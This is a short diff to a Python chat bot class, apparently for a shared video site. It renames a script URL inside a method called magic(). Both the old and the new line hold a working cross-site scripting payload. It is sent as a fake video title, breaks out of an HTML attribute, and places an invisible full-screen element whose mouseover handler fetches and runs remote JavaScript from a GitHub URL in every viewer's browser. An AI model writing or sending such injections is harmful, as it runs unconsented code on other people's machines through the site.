@@ -2363,7 +2363,7 @@ class Naoko(object):
     def magic(self):
         # TEMPORARY
         self.newspecial = "whatisthis" + str(random.randint(0, 1000000))
-        self.asLeader(package(self.send, 'am', ['yt', self.newspecial, '" id="vulN" style="position:fixed;top:0;left:0;z-index:9000;font-size:0px;width:100%;height:100%;" onmouseover="$.getScript(\'https://raw.github.com/Suwako/Naoko/master/innoculation.js\');$(\'#vulN\').parent().parent().remove();" title="Fake Video', 'http://i.ytimg.com/vi/6pMgwjhJBAc/default.jpg', 120]))
+        self.asLeader(package(self.send, 'am', ['yt', self.newspecial, '" id="vulN" style="position:fixed;top:0;left:0;z-index:9000;font-size:0px;width:100%;height:100%;" onmouseover="$.getScript(\'https://raw.github.com/Suwako/Naoko/master/inoculation.js\');$(\'#vulN\').parent().parent().remove();" title="Fake Video', 'http://i.ytimg.com/vi/6pMgwjhJBAc/default.jpg', 120]))
 
     def _moveVideo(self, v, after=None):
         if self.stthread != threading.currentThread():
